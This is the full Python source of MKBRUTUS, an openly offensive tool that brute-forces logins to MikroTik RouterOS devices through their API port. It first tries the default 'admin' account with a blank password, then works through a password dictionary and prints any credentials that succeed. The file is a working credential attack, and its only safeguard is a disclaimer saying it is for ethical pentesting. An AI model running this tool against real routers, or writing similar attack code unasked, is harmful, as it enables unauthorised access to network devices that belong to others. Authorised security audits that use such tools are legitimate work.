#!/usr/bin/env python
# -*- coding: utf-8 -*-

#=======================================================================================================================
#
# MKBRUTUS.py v1.0.1 - Password bruteforcer for MikroTik devices or boxes running RouterOS
#
# AUTHORS:
# Ramiro Caire   - email: ramiro.caire@gmail.com  / Twitter: @rcaire
# Federico Massa - email: fgmassa@vanguardsec.com / Twitter: @fgmassa
#
# WEB SITE:
# http://mkbrutusproject.github.io/MKBRUTUS/
# https://github.com/mkbrutusproject/mkbrutus
#
# SUMMARY:
# Some boxes running Mikrotik RouterOS (3.x or newer) have the API port enabled (by default, in the port 8728/TCP)
# for administrative purposes instead SSH, Winbox or HTTPS (or have all of them). This is (another) attack vector as it
# might be possible to perform a bruteforce to obtain valid credentials if no protection is available on that port.
# As the API uses a specific privative protocol, some code published by the vendor was included.
# Python 3.x is required in order to run this tool.
#
# DISCLAIMER:
# This tool is intended only for testing Mikrotik devices security in ethical pentest or audits process.
# The authors are not responsible for any damages you use this tool.
#
# MKBRUTUS is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# MKBRUTUS is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Affero Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#=======================================================================================================================

#Check for Python3
import sys
if sys.version_info < (3, 0):
    sys.stdout.write("Sorry, Python 3.x is required to run this tool\n")
    sys.exit(2)

import binascii
import getopt
import hashlib
import posix
import select
import socket
import time
import signal
import codecs


banner=('''          _   _   _   _  _____  ____ _   _  ____ _   _ _____
         |  \/  || | / /| ___ \ ___ \ | | |_   _| | | /  ___|
         | .  . || |/ / | |_/ / |_/ / | | | | | | | | \ `--.
         | |\/| ||    \ | ___ \    /| | | | | | | | | |`--. \\
         | |  | || |\  \| |_/ / |\ \| |_| | | | | |_| /\__/ /
         \_|  |_/\_| \_/\____/\_| \_|\___/  \_/  \___/\____/

                      Mikrotik RouterOS Bruteforce Tool 1.0.0
           Ramiro Caire (@rcaire) & Federico Massa (@fgmassa)
                    http://mkbrutusproject.github.io/MKBRUTUS
       ''')

def usage():
    print('''
    NAME
    \t MKBRUTUS.py - Password bruteforcer for MikroTik devices or boxes running RouterOS\n
    USAGE
    \t python mkbrutus.py [-t] [-p] [-u] [-d] [-q]\n
    OPTIONS
    \t -t, --target \t\t RouterOS target
    \t -p, --port \t\t RouterOS port (default 8728)
    \t -u, --user \t\t User name (default admin)
    \t -h, --help \t\t This help
    \t -d, --dictionary \t Password dictionary
    \t -q, --quiet \t\t Quiet mode
    ''')


def error(err):
    print(err)
    print("Try 'mkbrutus.py -h' or 'mkbrutus.py --help' for more information.")


def signal_handler(signal, frame):
    print(" Aborted by user. Exiting... ")
    sys.exit(2)


class ApiRos:
    '''Modified class from official RouterOS API'''
    def __init__(self, sk):
        self.sk = sk
        self.currenttag = 0

    def login(self, username, pwd):
        for repl, attrs in self.talk(["/login"]):
            chal = binascii.unhexlify((attrs['=ret']).encode('UTF-8'))
        md = hashlib.md5()
        md.update(b'\x00')
        md.update(pwd.encode('UTF-8'))
        md.update(chal)
        output = self.talk(["/login", "=name=" + username, "=response=00" + binascii.hexlify(md.digest()).decode('UTF-8')])
        return output

    def talk(self, words):
        if self.writeSentence(words) == 0: return
        r = []
        while 1:
            i = self.readSentence();
            if len(i) == 0: continue
            reply = i[0]
            attrs = {}
            for w in i[1:]:
                j = w.find('=', 1)
                if (j == -1):
                    attrs[w] = ''
                else:
                    attrs[w[:j]] = w[j+1:]
            r.append((reply, attrs))
            if reply == '!done': return r

    def writeSentence(self, words):
        ret = 0
        for w in words:
            self.writeWord(w)
            ret += 1
        self.writeWord('')
        return ret

    def readSentence(self):
        r = []
        while 1:
            w = self.readWord()
            if w == '': return r
            r.append(w)

    def writeWord(self, w):
        self.writeLen(len(w))
        self.writeStr(w)

    def readWord(self):
        ret = self.readStr(self.readLen())
        #print((">>> " + ret))
        return ret

    def writeLen(self, l):
        if l < 0x80:
            self.writeStr(chr(l))
        elif l < 0x4000:
            l |= 0x8000
            self.writeStr(chr((l >> 8) & 0xFF))
            self.writeStr(chr(l & 0xFF))
        elif l < 0x200000:
            l |= 0xC00000
            self.writeStr(chr((l >> 16) & 0xFF))
            self.writeStr(chr((l >> 8) & 0xFF))
            self.writeStr(chr(l & 0xFF))
        elif l < 0x10000000:
            l |= 0xE0000000
            self.writeStr(chr((l >> 24) & 0xFF))
            self.writeStr(chr((l >> 16) & 0xFF))
            self.writeStr(chr((l >> 8) & 0xFF))
            self.writeStr(chr(l & 0xFF))
        else:
            self.writeStr(chr(0xF0))
            self.writeStr(chr((l >> 24) & 0xFF))
            self.writeStr(chr((l >> 16) & 0xFF))
            self.writeStr(chr((l >> 8) & 0xFF))
            self.writeStr(chr(l & 0xFF))

    def readLen(self):
        c = ord(self.readStr(1))
        if (c & 0x80) == 0x00:
            pass
        elif (c & 0xC0) == 0x80:
            c &= ~0xC0
            c <<= 8
            c += ord(self.readStr(1))
        elif (c & 0xE0) == 0xC0:
            c &= ~0xE0
            c <<= 8
            c += ord(self.readStr(1))
            c <<= 8
            c += ord(self.readStr(1))
        elif (c & 0xF0) == 0xE0:
            c &= ~0xF0
            c <<= 8
            c += ord(self.readStr(1))
            c <<= 8
            c += ord(self.readStr(1))
            c <<= 8
            c += ord(self.readStr(1))
        elif (c & 0xF8) == 0xF0:
            c = ord(self.readStr(1))
            c <<= 8
            c += ord(self.readStr(1))
            c <<= 8
            c += ord(self.readStr(1))
            c <<= 8
            c += ord(self.readStr(1))
        return c

    def writeStr(self, str):
        n = 0;
        while n < len(str):
            r = self.sk.send(bytes(str[n:], 'UTF-8'))
            if r == 0: raise RuntimeError("Connection closed by remote end")
            n += r

    def readStr(self, length):
        ret = ''
        while len(ret) < length:
            s = self.sk.recv(length - len(ret))
            if s == '': raise RuntimeError("Connection closed by remote end")
            ret += s.decode('UTF-8', 'replace')
        return ret


def main():
    print(banner)
    try:
        opts, args = getopt.getopt(sys.argv[1:], "ht:p:u:d:q", ["help", "target=", "port=", "user=", "dictionary=", "quiet"])
    except getopt.GetoptError as err:
        error(err)
        sys.exit(2)

    if not opts:
        error("ERROR: You must specify at least a Target and a Dictionary")
        sys.exit(2)

    target = None
    port = None
    user = None
    dictionary = None
    quietmode = False

    for opt, arg in opts:
        if opt in ("-h", "--help"):
            usage()
            sys.exit(0)
        elif opt in ("-t", "--target"):
            target = arg
        elif opt in ("-p", "--port"):
            port = arg
        elif opt in ("-u", "--user"):
            user = arg
        elif opt in ("-d", "--dictionary"):
            dictionary = arg
        elif opt in ("-q", "--quiet"):
            quietmode = True
        else:
            assert False, "error"
            sys.exit(2)

    if not target:
        error("ERROR: You must specify a Target")
        sys.exit(2)
    if not port:
        port = 8728
    if not user:
        user = 'admin'
    try:
        with open(dictionary):
            pass
    except IOError as err:
        error(err)
        sys.exit(2)

    print("[*] Starting bruteforce attack...")
    print("-" * 33)

    # Catch KeyboardInterrupt
    signal.signal(signal.SIGINT, signal_handler)
    
    # Looking for default RouterOS creds
    defcredcheck = True
    
    # Get the number of lines in file
    count = 0
    dictFile = codecs.open(dictionary,'rb', encoding='utf-8', errors='ignore')
    while 1:
        buffer = dictFile.read(8192*1024)
        if not buffer: break
        count += buffer.count('\n')
    dictFile.seek(0)
    
    # Passwords iteration & socket creation
    items = 1
    for password in dictFile.readlines():
        password = password.strip('\n')
        s = None
        for res in socket.getaddrinfo(target, port, socket.AF_UNSPEC, socket.SOCK_STREAM):
            af, socktype, proto, canonname, sa = res
            try:
                 s = socket.socket(af, socktype, proto)
                 # Timeout threshold = 5 secs
                 s.settimeout(5)
            except (socket.error):
                s = None
                continue
            try:
                 s.connect(sa)
            except (socket.timeout):
                print("[-] Target timed out! Exiting...")
                s.close()
                sys.exit(1)
            except (socket.error):
                print("[-] SOCKET ERROR! Check Target (IP or PORT parameters). Exiting...")
                s.close()
                sys.exit(1)
        dictFile.close(  )
        apiros = ApiRos(s)

        # First of all, we'll try with RouterOS default credentials ("admin":"")
        while defcredcheck:
            defaultcreds = apiros.login("admin", "")
            login = ''.join(defaultcreds[0][0])

            print("[-] Trying with default credentials on RouterOS...")
            print()

            if login == "!done":
                print ("[+] Login successful!!! Default RouterOS credentials were not changed. Log in with admin:<BLANK>")
                sys.exit(0)
            else:
                print("[-] Default RouterOS credentials were unsuccessful, trying with " + str(count) + " passwords in list...")
                print("")
                defcredcheck = False
                time.sleep(1)
       
        loginoutput = apiros.login(user, password)
        login = ''.join(loginoutput[0][0])

        if not quietmode:
            print("[-] Trying " + str(items) + " of " + str(count) + " Paswords - Current: " + password)

        if login == "!done":
           print("[+] Login successful!!! User: " + user + " Password: " + password)
           sys.exit(0)
        items +=1


if __name__ == '__main__':
    main()
    # If this point is reached, no successful login was commited
    print("[*] ATTACK FINISHED! No suitable credentials were found. Try again with a different wordlist.")
